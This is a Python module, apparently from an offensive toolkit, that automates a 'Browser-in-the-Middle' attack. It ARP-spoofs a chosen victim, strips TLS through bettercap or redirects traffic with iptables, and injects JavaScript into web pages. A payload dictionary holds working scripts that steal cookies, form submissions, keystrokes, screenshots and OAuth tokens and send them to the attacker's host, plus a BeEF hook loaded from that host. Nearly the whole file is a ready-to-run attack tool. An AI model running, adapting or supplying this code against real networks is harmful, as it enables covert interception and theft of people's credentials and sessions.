"""Browser-in-the-Middle (BitM) attack engine.

Automates ARP spoofing, transparent HTTP proxy injection, and
credential harvesting. Coordinates bettercap/arpspoof with custom
JavaScript payload injection to capture browser sessions, cookies,
OAuth tokens, and form submissions from target browsers.
"""

from __future__ import annotations

import json
import os
import shlex
import shutil
import signal
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

BASE_DIR = Path(__file__).resolve().parent.parent
SESSIONS_DIR = BASE_DIR / "sessions"
BITM_SESSION_DIR = SESSIONS_DIR / "bitm"
BITM_STATE_FILE = BITM_SESSION_DIR / "bitm_state.json"

JS_INJECT_PAYLOADS: dict[str, str] = {
    "cookie_harvest": """
(function(){var c=document.cookie;if(c){var i=new Image();i.src='http://LHOST:LPORT/g?c='+btoa(c);}})();
""",
    "form_sniff": """
(function(){
  document.addEventListener('submit',function(e){
    var d={url:window.location.href,action:e.target.action,method:e.target.method};
    var f=e.target.elements;var v={};
    for(var i=0;i<f.length;i++){if(f[i].name)v[f[i].name]=f[i].value;}
    d.fields=v;
    var x=new XMLHttpRequest();
    x.open('POST','http://LHOST:LPORT/f',true);
    x.setRequestHeader('Content-Type','application/json');
    x.send(JSON.stringify(d));
  },true);
})();
""",
    "keylogger": """
(function(){
  var b='';
  document.addEventListener('keypress',function(e){
    b+=String.fromCharCode(e.charCode);
    if(b.length>50){
      var i=new Image();i.src='http://LHOST:LPORT/k?d='+btoa(b);b='';
    }
  },true);
})();
""",
    "screenshot": """
(function(){
  var t=document.title;var u=window.location.href;
  html2canvas&&html2canvas(document.body).then(function(c){
    var i=new Image();i.src='http://LHOST:LPORT/s?t='+encodeURIComponent(t)+'&u='+encodeURIComponent(u)+'&d='+c.toDataURL().split(',')[1];
  });
})();
""",
    "oauth_token_grab": """
(function(){
  ['localStorage','sessionStorage'].forEach(function(s){
    try{var d=window[s].getItem('oauth_token')||window[s].getItem('access_token')||window[s].getItem('id_token');
    if(d){var i=new Image();i.src='http://LHOST:LPORT/t?s='+s+'&v='+btoa(d);}}catch(e){}
  });
  try{var c=document.cookie.match(/access_token=([^;]+)/);
  if(c){var i=new Image();i.src='http://LHOST:LPORT/t?c='+btoa(c[1]);}}catch(e){}
})();
""",
    "beef_hook": """
(function(){
  var s=document.createElement('script');
  s.src='http://LHOST:LPORT/hook.js';
  s.type='text/javascript';
  document.head.appendChild(s);
})();
""",
}


@dataclass
class BitMState:
    """Current state of a BitM campaign."""

    active: bool = False
    interface: str = ""
    target_ip: str = ""
    gateway_ip: str = ""
    lhost: str = ""
    lport: int = 8080
    method: str = "bettercap"
    started_at: float = 0.0
    pid: int = 0
    captives_file: str = ""
    harvest_file: str = ""
    active_payloads: list[str] = field(default_factory=list)
    stats: dict[str, int] = field(default_factory=lambda: {"cookies": 0, "forms": 0, "keystrokes": 0, "tokens": 0})


def _ensure_bitm_dir() -> None:
    """Create the BitM sessions directory if it does not exist."""
    BITM_SESSION_DIR.mkdir(parents=True, exist_ok=True)


def _save_state(state: BitMState) -> None:
    """Persist BitM campaign state to disk.

    Args:
        state: Current BitM campaign state.
    """
    _ensure_bitm_dir()
    data = {
        "active": state.active,
        "interface": state.interface,
        "target_ip": state.target_ip,
        "gateway_ip": state.gateway_ip,
        "lhost": state.lhost,
        "lport": state.lport,
        "method": state.method,
        "started_at": state.started_at,
        "pid": state.pid,
        "captives_file": state.captives_file,
        "harvest_file": state.harvest_file,
        "active_payloads": state.active_payloads,
        "stats": state.stats,
    }
    with open(BITM_STATE_FILE, "w") as f:
        json.dump(data, f, indent=2)


def _load_state() -> BitMState:
    """Load the saved BitM campaign state from disk.

    Returns:
        Saved BitM state, or a fresh empty state.
    """
    _ensure_bitm_dir()
    if not BITM_STATE_FILE.exists():
        return BitMState()
    try:
        with open(BITM_STATE_FILE) as f:
            data = json.load(f)
        return BitMState(**{k: data.get(k) for k in BitMState.__dataclass_fields__})
    except Exception:
        return BitMState()


def _build_js_payload(payload_name: str, lhost: str, lport: int) -> str:
    """Build a JavaScript injection payload with attacker IP/port.

    Args:
        payload_name: Key from JS_INJECT_PAYLOADS.
        lhost: Attacker IP.
        lport: Attacker HTTP listener port.

    Returns:
        Minified JavaScript string ready for injection.
    """
    template = JS_INJECT_PAYLOADS.get(payload_name, "")
    if not template:
        return ""
    return template.replace("LHOST", lhost).replace("LPORT", str(lport)).replace("\n", " ").strip()


def _check_tool(tool: str) -> bool:
    """Verify a required external tool is on PATH.

    Args:
        tool: Binary name to check.

    Returns:
        True if the tool is available.
    """
    return shutil.which(tool) is not None


def _recommend_method() -> str:
    """Determine the best available ARP spoofing method.

    Returns:
        Method identifier: 'bettercap', 'arpspoof', or 'mitmproxy'.
    """
    if _check_tool("bettercap"):
        return "bettercap"
    if _check_tool("arpspoof"):
        return "arpspoof"
    if _check_tool("mitmproxy"):
        return "mitmproxy"
    return "none"


def _get_default_interface() -> str:
    """Detect the default network interface.

    Returns:
        Interface name (e.g. 'eth0', 'wlan0').
    """
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "dev" and i + 1 < len(parts):
                    return parts[i + 1]
    except Exception:
        pass

    try:
        result = subprocess.run(
            ["ip", "link", "show"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in result.stdout.splitlines():
            if "state UP" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    return parts[1].strip().split("@")[0]
    except Exception:
        pass

    return "eth0"


def _get_gateway_ip() -> str:
    """Detect the default gateway IP.

    Returns:
        Gateway IP address string.
    """
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "via" and i + 1 < len(parts):
                    return parts[i + 1]
    except Exception:
        pass
    return ""


def bitm_start(
    target_ip: str,
    gateway_ip: str = "",
    interface: str = "",
    lhost: str = "",
    lport: int = 8080,
    method: str = "auto",
    payloads: list[str] | None = None,
) -> dict[str, Any]:
    """Start a Browser-in-the-Middle attack.

    Args:
        target_ip: IP address of the victim machine.
        gateway_ip: Gateway IP (auto-detected if empty).
        interface: Network interface (auto-detected if empty).
        lhost: Attacker's IP for callbacks.
        lport: Attacker's HTTP listener port.
        method: ARP spoofing method ('bettercap', 'arpspoof', or 'auto').
        payloads: List of JS payload names to inject.

    Returns:
        Dict with 'success' bool and 'state' or 'error' string.
    """
    _ensure_bitm_dir()

    existing = _load_state()
    if existing.active:
        return {"success": False, "error": "BitM attack already active. Stop it first with bitm_stop."}

    if not target_ip:
        return {"success": False, "error": "target_ip is required."}

    chosen_method = method if method != "auto" else _recommend_method()
    if chosen_method == "none" or not _check_tool(chosen_method.split("/")[0]):
        return {
            "success": False,
            "error": "No suitable ARP spoofing tool found. Install bettercap, dsniff (arpspoof), or mitmproxy.",
        }

    if not interface:
        interface = _get_default_interface()
    if not gateway_ip:
        gateway_ip = _get_gateway_ip()

    if not gateway_ip:
        return {"success": False, "error": "Could not detect gateway IP. Specify --gateway."}

    active_payloads = payloads or ["cookie_harvest", "form_sniff", "oauth_token_grab"]
    js_combined = ""
    for name in active_payloads:
        js_piece = _build_js_payload(name, lhost, lport)
        if js_piece:
            js_combined += js_piece + "\n"

    harvest_path = str(BITM_SESSION_DIR / "bitm_harvest.log")
    captives_path = str(BITM_SESSION_DIR / "bitm_captives.jsonl")

    if chosen_method == "bettercap":
        success, pid = _start_bettercap(target_ip, gateway_ip, interface, lhost, lport, js_combined, harvest_path)
    elif chosen_method == "arpspoof":
        success, pid = _start_arpspoof(target_ip, gateway_ip, interface, lhost, lport, js_combined, harvest_path)
    else:
        return {"success": False, "error": f"Unsupported method: {chosen_method}"}

    if not success:
        return {"success": False, "error": f"Failed to start {chosen_method}. Check permissions (root required)."}

    state = BitMState(
        active=True,
        interface=interface,
        target_ip=target_ip,
        gateway_ip=gateway_ip,
        lhost=lhost,
        lport=lport,
        method=chosen_method,
        started_at=time.time(),
        pid=pid,
        captives_file=captives_path,
        harvest_file=harvest_path,
        active_payloads=active_payloads,
    )
    _save_state(state)

    return {
        "success": True,
        "state": {
            "interface": interface,
            "target_ip": target_ip,
            "gateway_ip": gateway_ip,
            "method": chosen_method,
            "payloads": active_payloads,
            "harvest_file": harvest_path,
            "pid": pid,
        },
    }


def _start_bettercap(
    target_ip: str, gateway_ip: str, interface: str, lhost: str, lport: int, js_payload: str, harvest_path: str
) -> tuple[bool, int]:
    """Start bettercap with ARP spoofing and JS injection.

    Args:
        target_ip: Victim IP.
        gateway_ip: Gateway IP.
        interface: Network interface.
        lhost: Attacker callback IP.
        lport: Attacker callback port.
        js_payload: Combined JavaScript inject string.
        harvest_path: Log file path.

    Returns:
        Tuple of (success, pid_or_zero).
    """
    caplet_path = BITM_SESSION_DIR / "bitm.cap"
    caplet_content = f"""net.probe on
net.recon on
http.proxy on
http.proxy.sslstrip true
set http.proxy.script {BITM_SESSION_DIR}/bitm_inject.js
set arp.spoof.targets {target_ip}
arp.spoof on
set net.sniff.output {harvest_path}
net.sniff on
"""

    inject_js_path = BITM_SESSION_DIR / "bitm_inject.js"
    inject_content = f"""
function onRequest(req, res) {{
    if (res.ContentType && res.ContentType.indexOf('text/html') !== -1) {{
        var body = res.ReadBody();
        if (body.indexOf('</body>') !== -1) {{
            body = body.replace('</body>', '<script>{js_payload}</script></body>');
            res.Body = body;
        }}
    }}
}}
"""
    with open(caplet_path, "w") as f:
        f.write(caplet_content)
    with open(inject_js_path, "w") as f:
        f.write(inject_content)

    try:
        proc = subprocess.Popen(
            ["bettercap", "-iface", interface, "-caplet", str(caplet_path)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp,
        )
        time.sleep(1.5)
        return True, proc.pid
    except Exception:
        return False, 0


def _start_arpspoof(
    target_ip: str, gateway_ip: str, interface: str, lhost: str, lport: int, js_payload: str, harvest_path: str
) -> tuple[bool, int]:
    """Start arpspoof + iptables-based traffic interception and JS injection.

    Args:
        target_ip: Victim IP.
        gateway_ip: Gateway IP.
        interface: Network interface.
        lhost: Attacker callback IP.
        lport: Attacker callback port.
        js_payload: Combined JavaScript inject string.
        harvest_path: Log file path.

    Returns:
        Tuple of (success, pid_or_zero).
    """
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True,
            timeout=5,
            check=False,
        )
    except Exception:
        return False, 0

    try:
        subprocess.run(
            [
                "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp",
                "--dport", "80", "-j", "DNAT", "--to-destination", f"{lhost}:{lport}",
            ],
            capture_output=True,
            timeout=5,
            check=False,
        )
    except Exception:
        return False, 0

    inject_js_path = BITM_SESSION_DIR / "bitm_inject.js"
    with open(inject_js_path, "w") as f:
        f.write(js_payload)

    try:
        proc = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", target_ip, gateway_ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp,
        )
        time.sleep(1.5)
        return True, proc.pid
    except Exception:
        return False, 0


def bitm_stop() -> dict[str, Any]:
    """Stop a running BitM attack and clean up iptables.

    Returns:
        Dict with status and harvested data summary.
    """
    state = _load_state()
    if not state.active:
        return {"success": False, "error": "No active BitM attack."}

    if state.pid:
        try:
            os.killpg(os.getpgid(state.pid), signal.SIGTERM)
        except (ProcessLookupError, OSError):
            pass

    if state.method == "arpspoof":
        try:
            subprocess.run(
                ["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT"],
                capture_output=True,
                timeout=5,
                check=False,
            )
        except Exception:
            pass
        try:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=0"],
                capture_output=True,
                timeout=5,
                check=False,
            )
        except Exception:
            pass

    harvest_data: list[str] = []
    if state.harvest_file and os.path.isfile(state.harvest_file):
        try:
            with open(state.harvest_file) as f:
                harvest_data = [line.strip() for line in f if line.strip()]
        except Exception:
            pass

    state.active = False
    _save_state(state)

    return {
        "success": True,
        "duration_seconds": int(time.time() - state.started_at),
        "target": state.target_ip,
        "payloads": state.active_payloads,
        "harvested_lines": len(harvest_data),
        "harvest_file": state.harvest_file,
        "captives_file": state.captives_file,
    }


def bitm_status() -> dict[str, Any]:
    """Return the current BitM attack status.

    Returns:
        Dict with active state and campaign details.
    """
    state = _load_state()
    if not state.active:
        return {"active": False}

    harvest_count = 0
    if state.harvest_file and os.path.isfile(state.harvest_file):
        try:
            with open(state.harvest_file) as f:
                harvest_count = sum(1 for _ in f)
        except Exception:
            pass

    return {
        "active": True,
        "interface": state.interface,
        "target_ip": state.target_ip,
        "gateway_ip": state.gateway_ip,
        "method": state.method,
        "lport": state.lport,
        "started_at": state.started_at,
        "uptime_seconds": int(time.time() - state.started_at) if state.started_at else 0,
        "payloads": state.active_payloads,
        "harvest_line_count": harvest_count,
        "harvest_file": state.harvest_file,
    }


def bitm_inject(payload_name: str) -> dict[str, Any]:
    """Inject an additional JS payload into an active BitM session.

    Args:
        payload_name: Key from JS_INJECT_PAYLOADS to inject.

    Returns:
        Dict with success status.
    """
    state = _load_state()
    if not state.active:
        return {"success": False, "error": "No active BitM attack."}

    if payload_name not in JS_INJECT_PAYLOADS:
        return {"success": False, "error": f"Unknown payload: {payload_name}. Available: {list(JS_INJECT_PAYLOADS.keys())}"}

    js = _build_js_payload(payload_name, state.lhost, state.lport)

    inject_path = BITM_SESSION_DIR / "bitm_inject.js"
    try:
        with open(inject_path, "a") as f:
            f.write("\n" + js + "\n")
    except Exception as exc:
        return {"success": False, "error": str(exc)}

    if payload_name not in state.active_payloads:
        state.active_payloads.append(payload_name)
        _save_state(state)

    return {"success": True, "payload": payload_name, "injected": True}


def bitm_harvest_stats() -> dict[str, Any]:
    """Return statistics on harvested credentials from the active/past campaign.

    Returns:
        Dict with counts of cookies, form submissions, tokens, keystrokes.
    """
    state = _load_state()
    stats: dict[str, int] = {"cookies": 0, "forms": 0, "keystrokes": 0, "tokens": 0, "total_lines": 0}

    harvest_file = state.harvest_file
    if not harvest_file or not os.path.isfile(harvest_file):
        return stats

    try:
        with open(harvest_file) as f:
            for line in f:
                stats["total_lines"] += 1
                if "/g?" in line:
                    stats["cookies"] += 1
                elif "/f" in line and "POST" in line:
                    stats["forms"] += 1
                elif "/k?" in line:
                    stats["keystrokes"] += 1
                elif "/t?" in line:
                    stats["tokens"] += 1
    except Exception:
        pass

    if state.active:
        state.stats = stats
        _save_state(state)

    return stats


def bitm_cleanup() -> dict[str, Any]:
    """Force-kill all BitM processes and remove the state file.

    Returns:
        Dict with cleanup status.
    """
    state = _load_state()
    if state.active:
        bitm_stop()

    try:
        if BITM_STATE_FILE.exists():
            BITM_STATE_FILE.unlink()
    except Exception:
        pass

    return {"success": True, "cleaned": True}


def main():
    """CLI entry point — display BitM status from command line."""
    status = bitm_status()
    if not status.get("active"):
        print("No active BitM attack.")
        print("Use: bitm start <target_ip> from the LazyOwn shell.")
    else:
        print(f"Active BitM: {status}")


if __name__ == "__main__":
    main()


__all__ = [
    "bitm_start",
    "bitm_stop",
    "bitm_status",
    "bitm_inject",
    "bitm_harvest_stats",
    "bitm_cleanup",
    "BitMState",
    "JS_INJECT_PAYLOADS",
]
